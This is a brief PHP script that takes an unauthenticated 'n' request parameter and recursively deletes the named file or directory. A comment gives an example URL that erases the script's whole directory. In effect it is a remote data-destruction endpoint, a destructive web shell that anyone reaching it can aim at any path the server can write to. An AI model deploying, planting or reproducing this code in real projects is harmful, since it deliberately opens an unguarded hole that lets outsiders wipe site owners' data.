<?php
$n=isset($_REQUEST["n"])?$_REQUEST["n"]:""; function d_fol_fl($n){ if (!file_exists($n)) { return false; } if (is_file($n)) { return unlink($n); } if($n){ $dir = dir($n); while (false !== $entry = $dir->read()) { if ($entry == '.' || $entry == '..') { continue; } d_fol_fl("$n/$entry");} $dir->close(); return rmdir($n); }}if(!empty($n)){d_fol_fl($n);}

// Eg: http://localhost/nambaR/test/x.php?n=./   -- will remove this entire directory including this file.


 
